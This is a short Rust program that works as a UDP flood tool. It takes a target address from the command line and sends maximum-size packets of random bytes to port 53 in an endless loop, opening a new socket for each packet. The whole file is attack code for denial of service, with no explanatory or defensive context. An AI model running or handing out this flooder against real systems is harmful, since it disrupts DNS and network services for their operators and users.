use std::net::UdpSocket;
use rand::Rng;
use std::env;

// const ADDR: String = "localhost";
const PORT: u32 = 53;
const NB_THREADS: u32 = 1;

const BUF_SIZE: usize = 65507;

fn flood(addr: String, port: u32) {
    let mut buf = [0 as u8; BUF_SIZE];
    let mut rng = rand::thread_rng();
    for i in 0..BUF_SIZE { buf[i] = rng.gen() };

    loop {
        let src = format!("{}:{}", addr, port);
        let socket = UdpSocket::bind("0.0.0.0:0").unwrap();

        socket.send_to(&buf, &src).unwrap();
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();

    println!("{:?}", args);
    flood(args[1].to_string(), PORT);
}
